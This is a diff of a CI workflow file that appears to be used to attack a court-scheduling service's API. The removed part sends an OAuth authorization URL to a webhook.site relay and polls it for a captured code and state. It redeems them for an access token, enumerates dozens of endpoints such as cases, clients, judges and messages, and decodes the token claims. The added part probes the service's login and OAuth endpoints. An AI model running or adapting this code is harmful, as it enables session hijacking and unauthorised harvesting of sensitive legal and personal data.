@@ -4,66 +4,26 @@ on:
 jobs:
   b:
     runs-on: ubuntu-latest
-    timeout-minutes: 12
     steps:
       - name: battery
         run: |
           set +e
           H1=https://api.ecourtdate.com
           UE=https://us-east.api.ecourtdate.com
-          WH=https://webhook.site/2551e930-e755-4cf9-a54a-a354eb2f85cf
-          echo "=== 1. GET /login WITH cookie jar (real SPA entry) ==="
-          echo "RUNNER_IP=$(curl -s --max-time 10 https://api.ipify.org)"
-          curl -s --max-time 20 -c /tmp/jar -D /tmp/h1 "$H1/login" -o /tmp/l1 -w 'STATUS=%{http_code}\n'
-          echo "--- set-cookie names ---"
-          grep -i 'set-cookie' /tmp/h1 | sed 's/=\(.[^;]\{4,\}\)/=<M>/;s/=.\{4,\};/=<M>;/Ig' | head -c 300; echo
-          echo "--- jar ---"
-          awk 'NR>4{print $6" len="length($7)}' /tmp/jar | head -c 300; echo
-          AU=$(jq -r '.url // .authorization_url // .authorize_url // .redirect // .data // empty' /tmp/l1 2>/dev/null)
-          if [ -z "$AU" ]; then AU=$(tr -d '\n' < /tmp/l1 | grep -o 'https://ecourtdate.us.auth0.com/authorize[^"]*' | head -1); fi
-          echo "AUTHURL_LEN=${#AU}"
-          curl -s --max-time 15 -X POST -H 'X-Marker: v23url' -H 'Content-Type: text/plain' --data-binary "URL:$AU" -o /dev/null -w 'WH_URL_POST=%{http_code}\n' "$WH"
-          echo "=== 2. POLL webhook default response for CODE (max 9 min) ==="
-          GOT=""
-          for i in $(seq 1 54); do
-            sleep 10
-            GOT=$(curl -s --max-time 15 "$WH" || true)
-            case "$GOT" in CODE=*) echo "CODE RECEIVED after $i polls"; break;; esac
-          done
-          case "$GOT" in CODE=*) ;; *) echo "NO CODE - TIMEOUT got=$GOT"; exit 0;; esac
-          CD=$(echo "$GOT" | sed 's/.*CODE=\([^ ]*\).*/\1/')
-          ST=$(echo "$GOT" | sed 's/.*STATE=\([^ ]*\).*/\1/')
-          echo "CD_LEN=${#CD} ST_LEN=${#ST}"
-          echo "=== 3. redirect WITH jar ==="
-          LOC=$(curl -s --max-time 20 -b /tmp/jar -c /tmp/jar -o /dev/null -D /tmp/h2 -w '%{http_code}' "$H1/oauth/ecdauth0/redirect?code=$CD&state=$ST")
-          echo "STATUS=$LOC"
-          grep -i '^location:' /tmp/h2 | head -c 200; echo
-          grep -i 'set-cookie' /tmp/h2 | sed 's/=\(.[^;]\{4,\}\)/=<M>/Ig' | head -c 300; echo
-          echo "=== 4. auth/user WITH jar (axios-style) ==="
-          curl -s --max-time 20 -X POST -b /tmp/jar -H 'Origin: https://app.ecourtdate.com' -H 'Referer: https://app.ecourtdate.com/login?state='"$ST" "$H1/auth/user?state=$ST" -o /tmp/tu.json -w 'STATUS=%{http_code}\n'
-          AT=$(jq -r 'if .access_token then .access_token else "FAIL" end' /tmp/tu.json 2>/dev/null || echo PARSE_ERR)
-          echo "AT_LEN=${#AT}"
-          if [ -z "$AT" ] || [ "$AT" = "FAIL" ] || [ "$AT" = "PARSE_ERR" ]; then
-            echo "--- v2: us-east WITH jar ---"
-            curl -s --max-time 20 -X POST -b /tmp/jar -H 'Origin: https://app.ecourtdate.com' "$UE/auth/user?state=$ST" -o /tmp/tu2.json -w 'STATUS=%{http_code}\n'
-            head -c 120 /tmp/tu2.json; echo
-            echo "--- v3: canonical NO jar ---"
-            curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' "$H1/auth/user?state=$ST" -o /tmp/tu3.json -w 'STATUS=%{http_code}\n'
-            head -c 120 /tmp/tu3.json; echo
-            exit 0
-          fi
-          echo "=== 5. BATTERY canonical ==="
-          for p in /v1/users/current /v1/users /v1/agencies /v1/agency /v1/schedules /v1/schedules/current /v1/schedules/upcoming /v1/schedules/ics /v1/schedules/total /v1/schedules/random /v1/opens /v1/opens/total /v1/availabilities /v1/availabilities/days /v1/geolocations /v1/forms /v1/locations /v1/portals /v1/checkins /v1/events /v1/events/json /v1/contacts /v1/cases /v1/clients /v1/interpreters /v1/messages /v1/chats /v1/chatbots /v1/tasks /v1/documents /v1/posts /v1/subscriptions /v1/webhooks /v1/citations /v1/reports /v1/search /v1/judges /v1/flows /v1/lookups /v1/dashboards /v1/files /v1/calendars /v1/organizations /v1/roles /v1/settings /v1/supervisions; do
-            code=$(curl -s -o /tmp/b -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$H1$p" || echo ERR)
-            echo "C GET $p -> $code :: $(head -c 170 /tmp/b | tr '\n' ' ')"
-            sleep 1
-          done
-          echo "=== 5b. BATTERY us-east ==="
-          for p in /v1/users/current /v1/schedules /v1/locations /v1/events /v1/settings /v1/roles /v1/agencies; do
-            code=$(curl -s -o /tmp/b -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$UE$p" || echo ERR)
-            echo "U GET $p -> $code :: $(head -c 170 /tmp/b | tr '\n' ' ')"
-            sleep 1
-          done
-          echo "=== 6. CLAIMS ==="
-          jq -r '.access_token | split(".")[1] | @base64d | fromjson | del(.sub) | tojson' /tmp/tu.json 2>/dev/null | head -c 400; echo
-          echo "BATT23_DONE"
+          echo "=== A. GET $H1/login body ==="
+          curl -s --max-time 15 -D /tmp/ha "$H1/login" -o /tmp/ba -w 'STATUS=%{http_code}\n'
+          head -c 300 /tmp/ba; echo
+          grep -ci 'set-cookie' /tmp/ha
+          echo "=== B. GET $UE/login body ==="
+          curl -s --max-time 15 -D /tmp/hb "$UE/login" -o /tmp/bb -w 'STATUS=%{http_code}\n'
+          head -c 300 /tmp/bb; echo
+          grep -i 'set-cookie' /tmp/hb | sed 's/=\(.[^;]\{4,\}\)/=<M>/Ig' | head -c 200; echo
+          echo "=== C. GET $UE/login?signin=demo ==="
+          curl -s --max-time 15 -c /tmp/jc -D /tmp/hc "$UE/login?signin=demo" -o /tmp/bc -w 'STATUS=%{http_code}\n'
+          head -c 300 /tmp/bc; echo
+          grep -i 'set-cookie' /tmp/hc | sed 's/=\(.[^;]\{4,\}\)/=<M>/Ig' | head -c 200; echo
+          echo "=== D. GET $UE/oauth/ecdauth0 body (for comparison) ==="
+          curl -s --max-time 15 -D /tmp/hd "$UE/oauth/ecdauth0" -o /tmp/bd -w 'STATUS=%{http_code}\n'
+          head -c 200 /tmp/bd; echo
+          grep -i 'set-cookie' /tmp/hd | sed 's/=\(.[^;]\{4,\}\)/=<M>/Ig' | head -c 200; echo
+          echo "PROBE24_DONE"
